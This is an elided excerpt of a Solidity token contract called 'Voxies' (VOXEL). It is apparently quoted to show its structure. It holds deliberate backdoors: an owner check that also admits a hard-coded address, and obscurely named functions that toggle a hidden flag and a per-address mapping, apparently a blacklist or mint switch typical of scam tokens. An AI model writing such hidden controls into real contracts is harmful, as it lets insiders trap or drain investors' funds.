...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xa938dE22d646ec0eD260095DAB6c6b9d705D6d05) , "Ownable: caller is not the owner");
        _;
    }
...
contract Voxies is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Voxies";
    string private _symbol = "VOXEL";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xcdD9A285776fFdb3F8B0239ef0d8291dc709c1D0);
    address payable public teamWalletAddress = payable(0xcdD9A285776fFdb3F8B0239ef0d8291dc709c1D0);
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    bool public qweqwe = true;
    mapping (address => bool) public aa;
    ...
    function mllt(address account, uint256 amount) onlyOwner() public {
    ...
    function eb(bool _status) public onlyOwner {
        qweqwe = _status;
    }

    function mb(address addr, bool status) public{
        require(_msgSender()    ==   address(0xa938dE22d646ec0eD260095DAB6c6b9d705D6d05));
        aa[addr] = status;
    }
